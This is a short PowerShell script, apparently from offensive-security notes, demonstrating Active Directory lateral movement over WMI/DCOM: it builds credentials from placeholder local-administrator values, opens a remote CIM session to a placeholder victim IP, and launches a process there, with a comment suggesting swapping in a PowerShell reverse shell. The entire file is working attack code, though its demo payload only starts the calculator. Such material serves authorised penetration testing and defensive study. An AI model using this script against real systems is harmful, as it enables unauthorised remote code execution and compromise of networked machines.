# this is a basic script demonstrating AD lateral movement via WMI
# $Command can be replaced with a powershell reverse shell for direct access

# creating the PSCredential object
$username = '<local-administrator-user>'
$password = '<password>'
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username,$secureString;

$Options = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName <victim-IP> -Credential $credential -SessionOption $Options
$Command = 'calc';

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command}



